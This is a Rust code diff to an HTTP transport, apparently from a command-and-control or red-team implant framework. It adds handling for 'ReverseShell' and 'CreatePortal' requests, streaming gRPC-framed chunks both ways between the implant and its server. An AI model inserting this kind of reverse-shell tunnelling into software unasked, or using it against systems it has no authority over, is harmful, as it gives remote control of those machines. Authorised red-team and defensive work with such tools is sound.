@@ -811,8 +811,7 @@ impl Transport for HTTP {
 
                 tokio::spawn(async move {
                     while let Some(req_chunk) = rx.recv().await {
-                        let frame_header =
-                            grpc_frame::FrameHeader::new(req_chunk.len() as u32);
+                        let frame_header = grpc_frame::FrameHeader::new(req_chunk.len() as u32);
                         if req_tx
                             .send_data(hyper_legacy::body::Bytes::from(
                                 frame_header.encode().to_vec(),
@@ -842,6 +841,62 @@ impl Transport for HTTP {
                 tx.send(body_bytes.to_vec())
                     .await
                     .map_err(|e| anyhow::anyhow!("Send failed: {}", e))?;
+            }
+            "ReverseShell" | "CreatePortal" => {
+                let (mut req_tx, body) = hyper_legacy::Body::channel();
+
+                tokio::spawn(async move {
+                    while let Some(req_chunk) = rx.recv().await {
+                        let frame_header = grpc_frame::FrameHeader::new(req_chunk.len() as u32);
+                        if req_tx
+                            .send_data(hyper_legacy::body::Bytes::from(
+                                frame_header.encode().to_vec(),
+                            ))
+                            .await
+                            .is_err()
+                        {
+                            break;
+                        }
+                        if req_tx
+                            .send_data(hyper_legacy::body::Bytes::from(req_chunk))
+                            .await
+                            .is_err()
+                        {
+                            break;
+                        }
+                    }
+                });
+
+                let req = self
+                    .request_builder(uri)
+                    .body(body)
+                    .context("Failed to build HTTP request")?;
+
+                let response = self.send_and_validate(req).await?;
+                let mut body = response.into_body();
+                let mut buffer = BytesMut::new();
+
+                loop {
+                    while let Some((_header, encrypted_message)) =
+                        grpc_frame::FrameHeader::extract_frame(&mut buffer)
+                    {
+                        let chunk = encrypted_message.to_vec();
+                        if tx.send(chunk).await.is_err() {
+                            // Forwarding channel closed, we can break out of sending
+                            break;
+                        }
+                    }
+
+                    match body.data().await {
+                        Some(Ok(chunk)) => {
+                            buffer.extend_from_slice(&chunk);
+                        }
+                        Some(Err(err)) => {
+                            return Err(anyhow::anyhow!("Failed to read chunk: {}", err))
+                        }
+                        None => break,
+                    }
+                }
             }
             _ => {
                 return Err(anyhow::anyhow!(
